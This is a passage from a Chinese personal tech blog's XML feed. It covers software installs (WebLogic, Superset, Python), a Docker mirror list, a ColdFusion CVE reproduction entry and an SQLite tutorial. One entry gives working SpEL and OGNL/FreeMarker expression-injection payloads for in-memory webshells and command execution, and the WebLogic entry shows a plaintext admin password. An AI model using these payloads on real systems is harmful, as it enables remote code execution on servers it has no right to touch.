class="hljs-attribute">JRE_HOME</span>=/usr/local/jdk1.8.0_65/jre<span class="hljs-built_in">export</span> <span class="hljs-attribute">CLASSPATH</span>=.:$JAVA_HOME/lib:$JRE_HOME/lib:$CLASSPATH<span class="hljs-built_in">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$JAVA_HOME</span>/bin:$JRE_HOME/bin:$PATHEOFsource /etc/profile</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>软件安装</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python安装</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/Python/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/Python/</url>
    
    <content type="html"><![CDATA[<h1 id="Python2"><a href="#Python2" class="headerlink" title="Python2"></a>Python2</h1><h2 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h2><div class="code-wrapper"><pre><code class="hljs dsconfig"><span class="hljs-string">curl</span> <span class="hljs-string">https</span>://<span class="hljs-string">bootstrap</span>.<span class="hljs-string">pypa</span>.<span class="hljs-string">io</span>/<span class="hljs-built_in">get-pip.py</span> -<span class="hljs-string">o</span> <span class="hljs-built_in">get-pip.py</span><span class="hljs-string">python</span> <span class="hljs-built_in">get-pip.py</span></code></pre></div><h2 id="安装requirement-txt"><a href="#安装requirement-txt" class="headerlink" title="安装requirement.txt"></a>安装requirement.txt</h2><div class="code-wrapper"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> -r requirement.txt</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>软件安装</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Weblogic安装</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/Weblogic/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/Weblogic/</url>
    
    <content type="html"><![CDATA[<h1 id="安装Java"><a href="#安装Java" class="headerlink" title="安装Java"></a>安装Java</h1><h1 id="安装Weblogic"><a href="#安装Weblogic" class="headerlink" title="安装Weblogic"></a>安装Weblogic</h1><h2 id="创建用户及目录"><a href="#创建用户及目录" class="headerlink" title="创建用户及目录"></a>创建用户及目录</h2><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p /usr/local/weblogic/middleware<span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p /usr/local/weblogic/oraInventory<span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chown</span> -R weblogic:weblogic /usr/local/weblogicuseradd weblogicpasswd weblogic</code></pre></div><h2 id="创建响应文件"><a href="#创建响应文件" class="headerlink" title="创建响应文件"></a>创建响应文件</h2><div class="code-wrapper"><pre><code class="hljs routeros">cat &lt;&lt; EOF &gt;&gt; /tmp/weblogic_install.rsp[ENGINE]<span class="hljs-comment">#DO NOT CHANGE THIS.</span>Response File <span class="hljs-attribute">Version</span>=1.0.0.0.0[GENERIC]<span class="hljs-comment">#The oracle home location. This can be an existing Oracle Home or a new Oracle Home</span><span class="hljs-attribute">ORACLE_HOME</span>=/usr/local/weblogic/middleware<span class="hljs-comment">#Set this variable value to the Installation Type selected. e.g. WebLogic Server, Coherence, Complete with Examples.</span><span class="hljs-attribute">INSTALL_TYPE</span>=WebLogic<span class="hljs-built_in"> Server</span><span class="hljs-built_in"></span><span class="hljs-comment">#Provide the My Oracle Support Username. If you wish to ignore Oracle Configuration Manager configuration provide empty string for user name.</span>MYORACLESUPPORT_USERNAME=<span class="hljs-comment">#Provide the My Oracle Support Password</span><span class="hljs-attribute">MYORACLESUPPORT_PASSWORD</span>=&lt;SECURE VALUE&gt;<span class="hljs-comment">#Set this to true if you wish to decline the security updates. Setting this to true and providing empty string for My Oracle Support username will ignore the Oracle Configuration Manager configuration</span><span class="hljs-attribute">DECLINE_SECURITY_UPDATES</span>=<span class="hljs-literal">true</span><span class="hljs-comment">#Set this to true if My Oracle Support Password is specified</span><span class="hljs-attribute">SECURITY_UPDATES_VIA_MYORACLESUPPORT</span>=<span class="hljs-literal">false</span><span class="hljs-comment">#Provide the Proxy Host</span>PROXY_HOST=<span class="hljs-comment">#Provide the Proxy Port</span>PROXY_PORT=<span class="hljs-comment">#Provide the Proxy Username</span>PROXY_USER=<span class="hljs-comment">#Provide the Proxy Password</span><span class="hljs-attribute">PROXY_PWD</span>=&lt;SECURE VALUE&gt;<span class="hljs-comment">#Type String (URL format) Indicates the OCM Repeater URL which should be of the format [scheme[Http/Https]]://[repeater host]:[repeater port]</span>COLLECTOR_SUPPORTHUB_URL=EOF</code></pre></div><h2 id="创建oraInst-loc文件"><a href="#创建oraInst-loc文件" class="headerlink" title="创建oraInst.loc文件"></a>创建oraInst.loc文件</h2><p><strong>Oracle 产品清单（Oracle Inventory）</strong> 的路径配置，主要用于记录 Oracle 软件（如 WebLogic、数据库等）的安装信息</p><div class="code-wrapper"><pre><code class="hljs pgsql">cat <span class="hljs-symbol">&lt;&lt; EOF &gt;&gt;</span> /tmp/weblogic_oraInst.locinventory_loc=/usr/<span class="hljs-keyword">local</span>/weblogic/oraInventoryinst_group=oinstallEOF</code></pre></div><h2 id="创建域响应文件"><a href="#创建域响应文件" class="headerlink" title="创建域响应文件"></a>创建域响应文件</h2><div class="code-wrapper"><pre><code class="hljs stylus">cat &lt;&lt; EOF &gt;&gt; /tmp/weblogic_domain<span class="hljs-selector-class">.py</span><span class="hljs-function"><span class="hljs-title">readTemplate</span><span class="hljs-params">(<span class="hljs-string">&#x27;/usr/local/weblogic/middleware/wlserver/common/templates/wls/wls.jar&#x27;</span>)</span></span><span class="hljs-function"><span class="hljs-title">cd</span><span class="hljs-params">(<span class="hljs-string">&#x27;Servers/AdminServer&#x27;</span>)</span></span><span class="hljs-function"><span class="hljs-title">set</span><span class="hljs-params">(<span class="hljs-string">&#x27;ListenPort&#x27;</span>, <span class="hljs-number">7001</span>)</span></span><span class="hljs-function"><span class="hljs-title">set</span><span class="hljs-params">(<span class="hljs-string">&#x27;Name&#x27;</span>, <span class="hljs-string">&#x27;AdminServer&#x27;</span>)</span></span><span class="hljs-function"><span class="hljs-title">cd</span><span class="hljs-params">(<span class="hljs-string">&#x27;/Security/base_domain/User/weblogic&#x27;</span>)</span></span>cmo<span class="hljs-selector-class">.setPassword</span>(<span class="hljs-string">&#x27;Jowto@2307&#x27;</span>)<span class="hljs-function"><span class="hljs-title">cd</span><span class="hljs-params">(<span class="hljs-string">&#x27;/&#x27;</span>)</span></span><span class="hljs-function"><span class="hljs-title">setOption</span><span class="hljs-params">(<span class="hljs-string">&#x27;OverwriteDomain&#x27;</span>, <span class="hljs-string">&#x27;true&#x27;</span>)</span></span><span class="hljs-function"><span class="hljs-title">writeDomain</span><span class="hljs-params">(<span class="hljs-string">&#x27;/usr/local/weblogic/middleware/user_projects/domains/base_domain&#x27;</span>)</span></span><span class="hljs-function"><span class="hljs-title">closeTemplate</span><span class="hljs-params">()</span></span>EOF</code></pre></div><h2 id="执行静默安装"><a href="#执行静默安装" class="headerlink" title="执行静默安装"></a>执行静默安装</h2><p>使安装加速</p><div class="code-wrapper"><pre><code class="hljs jboss-cli">sed -i &#x27;s/securerandom\<span class="hljs-string">.source=file</span>:\<span class="hljs-string">/dev</span>\<span class="hljs-string">/random/securerandom</span>\<span class="hljs-string">.source=file</span>:\<span class="hljs-string">/dev</span>\/\.\<span class="hljs-string">/urandom/g</span>&#x27; <span class="hljs-string">&quot;$JAVA_HOME/jre/lib/security/java.security&quot;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar fmw_<span class="hljs-number">12.2.1.3</span>.<span class="hljs-number">0</span>_wls.jar -silent -responseFile /tmp/weblogic_install.rsp -invPtrLoc /tmp/weblogic_oraInst.loc</code></pre></div><h2 id="执行创建域命令"><a href="#执行创建域命令" class="headerlink" title="执行创建域命令"></a>执行创建域命令</h2><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/weblogic/mi</span>ddleware<span class="hljs-regexp">/wlserver/</span>common<span class="hljs-regexp">/bin/</span>wlst.sh <span class="hljs-regexp">/tmp/</span>weblogic_domain.py</code></pre></div><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><div class="code-wrapper"><pre><code class="hljs awk">cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/weblogic/mi</span>ddleware<span class="hljs-regexp">/user_projects/</span>domains<span class="hljs-regexp">/base_domain/</span>bin./startWebLogic.sh</code></pre></div><p><strong>访问</strong></p><div class="code-wrapper"><pre><code class="hljs crystal"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/10.58.125.35:7001/console</span><span class="hljs-regexp">/login/</span>LoginForm.jspweblogicJowto<span class="hljs-variable">@230</span>7</code></pre></div><p><strong>安装信息</strong></p><div class="code-wrapper"><pre><code class="hljs awk">安装路径：<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/weblogic/mi</span>ddleware域路径：<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/weblogic/mi</span>ddleware<span class="hljs-regexp">/user_projects/</span>domains/base_domain产品清单信息路径：<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/weblogic/</span>oraInventory</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>软件安装</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Weblogic</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker问题记录</title>
    <link href="/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/Docker/"/>
    <url>/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/Docker/</url>
    
    <content type="html"><![CDATA[<h1 id="无法访问国外镜像源"><a href="#无法访问国外镜像源" class="headerlink" title="无法访问国外镜像源"></a>无法访问国外镜像源</h1><p>报错如下</p><div class="code-wrapper"><pre><code class="hljs routeros">Unable <span class="hljs-keyword">to</span> <span class="hljs-built_in">find</span> image <span class="hljs-string">&#x27;mysql:5.7.36&#x27;</span> locallydocker: <span class="hljs-built_in">Error</span> response <span class="hljs-keyword">from</span> daemon: <span class="hljs-built_in">Get</span> <span class="hljs-string">&quot;https://registry-1.docker.io/v2/&quot;</span>: net/http: request canceled <span class="hljs-keyword">while</span> waiting <span class="hljs-keyword">for</span><span class="hljs-built_in"> connection </span>(Client.Timeout exceeded <span class="hljs-keyword">while</span> awaiting headers).See <span class="hljs-string">&#x27;docker run --help&#x27;</span>.</code></pre></div><p>vim &#x2F;etc&#x2F;docker&#x2F;daemon.json</p><div class="code-wrapper"><pre><code class="hljs prolog">&#123;    <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [        <span class="hljs-string">&quot;https://docker.1ms.run&quot;</span>,        <span class="hljs-string">&quot;https://doublezonline.cloud&quot;</span>,        <span class="hljs-string">&quot;https://dislabaiot.xyz&quot;</span>,        <span class="hljs-string">&quot;https://docker.fxxk.dedyn.io&quot;</span>,        <span class="hljs-string">&quot;https://dockerpull.org&quot;</span>,        <span class="hljs-string">&quot;https://docker.unsee.tech&quot;</span>,        <span class="hljs-string">&quot;https://hub.rat.dev&quot;</span>,        <span class="hljs-string">&quot;https://docker.1panel.live&quot;</span>,        <span class="hljs-string">&quot;https://docker.nastool.de&quot;</span>,        <span class="hljs-string">&quot;https://docker.zhai.cm&quot;</span>,        <span class="hljs-string">&quot;https://docker.5z5f.com&quot;</span>,        <span class="hljs-string">&quot;https://a.ussh.net&quot;</span>,        <span class="hljs-string">&quot;https://docker.udayun.com&quot;</span>,        <span class="hljs-string">&quot;https://hub.geekery.cn&quot;</span>    ]&#125;</code></pre></div><p>重启docker</p>]]></content>
    
    
    <categories>
      
      <category>问题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lightroom</title>
    <link href="/%E6%91%84%E5%BD%B1%E6%95%99%E7%A8%8B/Lightroom/"/>
    <url>/%E6%91%84%E5%BD%B1%E6%95%99%E7%A8%8B/Lightroom/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a7fe5a1c46478daf478d8e6640cffb5d02e2d1d5c082055a0b68dbff81119b16">33c3996212b88ecec05d553659a5cbadf166e4d24dedb06101a34b2f25fede75c0d847790c96f0b47b7323cb22a612af290ac78329961268f041013f4726b47fb89c30ec29b906456d08f701a4c041522bf9431c05f56b1212725a2aaff151756ad3e56a012efeef5b77a1e0daf40d75c2d74bb149fd318cf0e15a14f0b8ff92713d90ec64ba4738e5631a46ae11fb34f711fe3050fdbaaf29ade742359cefec92929fd9e2d212371580084aab3eae9d24b14956ee2ec4a641d0c98c44e8d7741c746c216532e805a148f63c5ece6c06905d84dcb67ccb2c1788fd0045246c2b2f0f81f80e4fb1b19d2b8c4e21fac949e255a267d502086143f430b67740dbe3d7d5cf5c1bbc27cb08ff22723b2084359f95aed37d1fa62e3680b1524d4bbffb22625797114ab7ef221926648bf3d377b13f04ced7ff03b563e95410876337af961bba2eb60b661896726223b76d2c56dee1fd5bff459e4dca56376eb33a53b042e8201fda15fdf0762d3d8adffd5503ab53bb5d776a13076efd0536bd6ce7b39df3a43091f68ca13abd31348a229e8392ab1b6481044d1991b11451ecfd974c3f4798359a9e0f8801f78ad616f6db8f92d2d1dd8095942ccfda80fca815938f5aefab69344f1e5c148dc4c2c5e93dda7a0df5cc8a9d17f2f0f87b395056a6f5a4a9e952678360793282eb95a14f2ae6b61582bbce78010dd37c998dfb44ac5b849e0f2fe9eb05ab4df56a506f46cbc3fc3ef58f71f7dc01becfee5c6be3098d40891dffc5df63e7d008b1e318ba3c3494095a8af2c164219746bea972697fb2723928866b6aff31a275d7c5d869871fbe4ed8589778b48b6af1893487e3d0b8cfbf360bad6353bb435a22c706c5212141fdb592bbbcf646f4797acb9e42afc8d6d8edcfc6a4c953fd3de363166470f90ab0c5c71a6d1676a5e9bdbef96b75d139e262c7553023004a331b09fdcf2b647600ae78c02d5540d2e58bd432766ba8f2fd814e1036568ccd13428691ef32f56670514e87538ea2ae709129c9b80a6bdaac0f8cb8deeb7e200f72179647af2f9ddee275df31622dabf4c3a69f7c67663aa9b16c4df8f7ecc9c12fb381e05a6ef2a3ca54361f881a63f136d09860537ce7fc2b8033505edb0fb039874abf320ad9fbe9f78da011d35fb70ec0d1dc4a28b47fbe59248bc59cfa449b6b86a6e78ace9deb422490821f0cc091d84d88a3cd3a3e6d1bc8d823ff201d475f03b8694939f87ebf0ac0b218654d5ed174824321f035de58c128d6450dae0463bc75c580f90c07b643565c04b31919830e3b7dde7e10ba328188c8ba208c39a8debbef1df9c93b2570d8ad928e7dfe368356f06683f6dc8144e9d1a8a4a09be565838d512023ea643a1c53eac244b70419816737231a63c75a20920dc52d269a6a8f034ccfaacac65d473782135198d19343e5aaaad9e93556a514255ee63f2fa9cc8fa99743cc1eead59c161b22129765210e8592034f376a150a9e21230ce75ee3bee89b7aafa0e9187ea02c65177bdd965450e537fa2bb1ee85ad8f3dbcd71609712b119315ecf9bd122724c02a2e1861768212834b7c0374f42926e1da267038379af46b1dec580c54492d6a15604e227425c139543c0a9aff7925f3e8bb3d8b7b58d612e6d840515cc378536df09a1b9e59ea782b16ff41cf7180a19ee69c322bb70a500129138846deab276cd42e703c193e6fe05eb69f7e4ee58edd642bf0dc30b4deb34086c9b024f8670988f1e2529a94fec36757f68d02a6efd45e2c5a75a9cfa4c634d056867754d0605abf8e8e9e3b1da08632195cfed810c4166e3a3fb0c9c1ea095042f57470a10b597cbc9fc1b64ac6d2eacb478df942cd9706d29e870dc57175a81cb28c0f692f0a679ad73f7915b99f13fd2a61870455da1cb1243bce0d380bda6de85d4b75405bd0a46c2319a7cd8510b68a90e8d51446b5ebfdd42bec47c355e397f46c4727efe46fb4aebf04febf9e6d7f8ac6839faebdfbda49259804ec770ff46a630256be82efe8a6b5d57719a45906bd1f521e6b8ee2b0addc27eff82a682b6a115d9b80894c79e2f8fc58ea775be9cefa0f1b10d97fdee94fce6af9fd05d13675085d47c4159c035d08fe351bc8ab3cbb1623b4a4715d89939105bf667aad37e505e0f7883fb9863c1ff9071c5f89a2ca57181102df827c57121b8f99e413baea60d9ca96da026520f21c7d7911b7d34645643168973670354a0f6c886beebf730bfba09eb03e123489a33eafd2174518b4b1e533124ca9fefadf7a6334d14460f7851347387f45e711c9bd953349d0c0825343c5b933bbf17110a23c26f719a00bd2128e7d602c4be0c89926fa69a625920724058d74e392073e093fd82520f38d5b1a440a12d52b3410782f23770ac22f571945f5e58c24f7e8e28b228f3fe126e77dcee35db4da3acbd5e281d24113793c1126e42797f576608c1f7d39a279c71131ac94cbca1ad09d5c692d801835cc941002dea2b5caad1d15b34e55ee74554141b42816a55b8e39f4b241cee402bae6240328f0fdcc4046eacc148393c80150010d00f5356162c8b1560b538c7e0aa32c9f343a225b503a75aa8bf41f450c2fcc0ba9428fd3a21a564c85c17baeb55f6b8403a12f1c68a9e5166029ac2a6f2c1d2484041ea86cc47f506dc2c731926c033202a6f795011de7add5d1cfe07314c3a97627ff469b9c5198c3ed37edb2e300816466c2193c3982ef260bed10adcf08cec515f750e6b5f61f15aa6baf0f98828e1c946c5c0304e8ad7e0e69c156d642dc941d658e50dec102e24bddb840becf01ec0039a03bb4664133428116dbbe1f0741ebaa394ca951826a052d8ddea34b70d57c10d504b3dc9b8995b08f0b3fab951200cc5b91762675b5013a5265b81893580066710f1a05b0dd5743dbb98ca4fa45a453113260fc3569ec40ca7073cadfc0dfa6c554b4093b351f4cb11546ccf805be161067718896631b41ef9a37292a779389e7dbd2cd1f99c4cccca42329b8cc3332aa1e3f5a7481593087588db8ae105d54eef49a62b9a36b0a096b19c987cb11242d98286a33fd2603f7da81b9ec915f9e3b341888da4c9ba999c5a5d0daeab7573b07971f7b876e5aaea9cd4852d6514d960345be3e2261ada8fd18acfc95324a16e48ea4253e6773d18791f91cb686437be2d0ce9d914a3a971dab6a630482390d60722a20437f58b30cb7c75d96dc81450b23789b1a924469818ddaaf0938ca2c2393789e00de191c2899356b6edd50e8e05f7c7cd9324220d2725eaef4baa561179c2826b05e8290ad46acf13ec37b12a0947f4b6db51d7273953be40039012208498860ffc5ce3015723a13b78f7f4ccd18b865945afd6638575e674f7e1fd3a4304c4cf2dc303a7375e1a1ae7c3703cf011e263821b576804fd2bb90de8dcf5c82def53b3c76e6641f8ce44adb453eee7afadf143dc7d17ec8c62e7e55a87b9ea22d0e0549d68a1fd12ff416c906643b7b7f9893777edcde28ed1a448c2471c42fbacdea43111f8c17062139ff86e61ecfcfbd727c14ceb6115855067f0f0671c43d49c455113ab403b1ce61bdb55ac7d584e1a4287e5c9f5a13516e8f7abf55266f9974cdeb026f9c919b6ef69dcaad847cc2fc20983272e67bf1b85876daf208ab21db6b1265380f2801ba701ff6d0cd8ac3e2dab341ceb3b2a104dbca55b78b7d2742dca180ed4b27c1574633739a8d70290662180de856fe0986b72bb40db537bd8f8bbf9d264cd502615503e2269fb77e6ddc3630ea31ea97ed93c480f42e87585ff75fcca141bf0a0542aaaad80704882c44aa8e293fe9bacab7f0e6c35791cbbc1135171028754f822275745059cfcf4006b16d62f74d9db0a124330c240ce8df2fee0a982f64cd8f1cb00da15f71188be3fd11a637a946faf489fe8e29a5aa03c10957bc67fbe15b6b1f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>摄影教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Lightroom</tag>
      
      <tag>Photograph</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Geoserver搭建</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Geoserver/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Geoserver/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><strong>下载</strong></p><div class="code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">https:</span>//geoserver<span class="hljs-meta">.org</span>/download/</code></pre></div><p>安装jdk11</p><p><strong>安装</strong></p><div class="code-wrapper"><pre><code class="hljs bash">unzip geoserver-2.23.3-bin.zip -d geoserver<span class="hljs-built_in">cd</span> geoserverbin/startup.shhttp://ip:8080/geoserveradmin/geoserver</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>表达式</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%88%A9%E7%94%A8/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="SpEL"><a href="#SpEL" class="headerlink" title="SpEL"></a>SpEL</h1><p>实现任意类加载，可实现注入内存马，命令执行回显，写入webshell等</p><div class="code-wrapper"><pre><code class="hljs stylus">#&#123;<span class="hljs-built_in">T</span>(org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cglib</span><span class="hljs-selector-class">.core</span>.ReflectUtils)<span class="hljs-selector-class">.defineClass</span>(<span class="hljs-string">&#x27;CMDResponse&#x27;</span>,<span class="hljs-built_in">T</span>(org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.util</span>.Base64Utils)<span class="hljs-selector-class">.decodeFromString</span>(base64Str<span class="hljs-selector-class">.toString</span>()),new javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.loading</span><span class="hljs-selector-class">.MLet</span>(new java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URL</span><span class="hljs-selector-attr">[0]</span>,<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Thread)<span class="hljs-selector-class">.currentThread</span>()<span class="hljs-selector-class">.getContextClassLoader</span>()))<span class="hljs-selector-class">.newInstance</span>()<span class="hljs-selector-class">.Client</span>(cmd<span class="hljs-selector-class">.toString</span>())&#125;</code></pre></div><h1 id="OGNL"><a href="#OGNL" class="headerlink" title="OGNL"></a>OGNL</h1><p>struts2  freemarker</p><div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-selector-id">#request</span><span class="hljs-selector-class">.get</span>(<span class="hljs-string">&#x27;.KEY_velocity.struts2.context&#x27;</span>)<span class="hljs-selector-class">.internalGet</span>(<span class="hljs-string">&#x27;ognl&#x27;</span>)<span class="hljs-selector-class">.findValue</span>(<span class="hljs-selector-id">#parameters</span><span class="hljs-selector-class">.poc</span><span class="hljs-selector-attr">[0]</span>,&#123;&#125;) <span class="hljs-string">&#x27;&amp;poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader(&#x27;</span>cmd<span class="hljs-string">&#x27;,(new freemarker.template.utility.Execute()).exec(&#123;&quot;id&quot;&#125;))</span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>攻防技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache Superset安装</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/Apache%20Superset/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/Apache%20Superset/</url>
    
    <content type="html"><![CDATA[<h1 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h1><p><a href="https://superset.apache.org/docs/quickstart">https://superset.apache.org/docs/quickstart</a></p><div class="code-wrapper"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/apache/superset安装最新版本docker compose -f docker-compose-image-<span class="hljs-keyword">tag</span>.yml up安装指定版本export <span class="hljs-attr">TAG=</span><span class="hljs-number">3.1</span>.<span class="hljs-number">1</span>docker compose -f docker-compose-image-<span class="hljs-keyword">tag</span>.yml up -d</code></pre></div><p><strong>中文设置</strong></p><div class="code-wrapper"><pre><code class="hljs vim">docker exec -it superset_app bashapt <span class="hljs-keyword">update</span>apt install <span class="hljs-keyword">vim</span><span class="hljs-keyword">vim</span> /app/superset/config.<span class="hljs-keyword">py</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240911162728734.png">  </p><div class="code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker restart superset_app</span></code></pre></div><p><strong>访问</strong></p><div class="code-wrapper"><pre><code class="hljs bash">http://localhost:8088  admin/admin</code></pre></div><p>![](&#x2F;Users&#x2F;pacemrc&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20240911162850145.png) </p>]]></content>
    
    
    <categories>
      
      <category>软件安装</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ColdFusion-CVE-2024-20767</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ColdFusion-CVE-2024-20767/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ColdFusion-CVE-2024-20767/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载</p><p>ColdFusion_2023_GUI_WWEJ_linux64.bin</p><p><a href="https://www.adobe.com/products/coldfusion/download-trial/try.html">https://www.adobe.com/products/coldfusion/download-trial/try.html</a></p><p>安装</p><p><a href="https://helpx.adobe.com/coldfusion/using/install-coldfusion-2021.html">https://helpx.adobe.com/coldfusion/using/install-coldfusion-2021.html</a></p><p>配置允许访问IP：</p><p>&#x2F;opt&#x2F;ColdFusion2023&#x2F;cfusion&#x2F;lib&#x2F;neo-security.xml</p><p>allowedAdminIPList</p><p>访问</p><p><a href="http://127.0.0.1:8500/CFIDE/administrator/index.cfm">http://127.0.0.1:8500/CFIDE/administrator/index.cfm</a></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240327141040752.png"> </p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p><a href="https://github.com/yoryio/CVE-2024-20767">https://github.com/yoryio/CVE-2024-20767</a></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240327143634963.png"> </p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>嵌入式数据库</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/Database/SQLite3/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/Database/SQLite3/</url>
    
    <content type="html"><![CDATA[<h1 id="嵌入式数据库"><a href="#嵌入式数据库" class="headerlink" title="嵌入式数据库"></a>嵌入式数据库</h1><h2 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h2><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>安装</p><div class="code-wrapper"><pre><code class="hljs bash">brew install sqlite3添加至环境变量<span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;export PATH=&quot;/opt/homebrew/opt/sqlite/bin:$PATH&quot;&#x27;</span> &gt;&gt; ~/.zshrc</code></pre></div><p>进入sqlite3</p><div class="code-wrapper"><pre><code class="hljs">sqlite3</code></pre></div><p>创建数据库</p><div class="code-wrapper"><pre><code class="hljs stata">.<span class="hljs-keyword">open</span> /path/ti/<span class="hljs-keyword">test</span>.<span class="hljs-keyword">db</span></code></pre></div><p>连接数据库文件</p><div class="code-wrapper"><pre><code class="hljs css">sqlite3 /<span class="hljs-selector-tag">path</span>/<span class="hljs-selector-tag">to</span>/test<span class="hljs-selector-class">.db</span></code></pre></div><p>创建表</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">user</span> (  id <span class="hljs-type">INTEGER</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">PRIMARY KEY</span> AUTOINCREMENT,  <span class="hljs-type">name</span> <span class="hljs-type">TEXT</span>);</code></pre></div><p>查看所有表</p><div class="code-wrapper"><pre><code class="hljs asciidoc"><span class="hljs-title">.table</span></code></pre></div><p>查看指定表</p><div 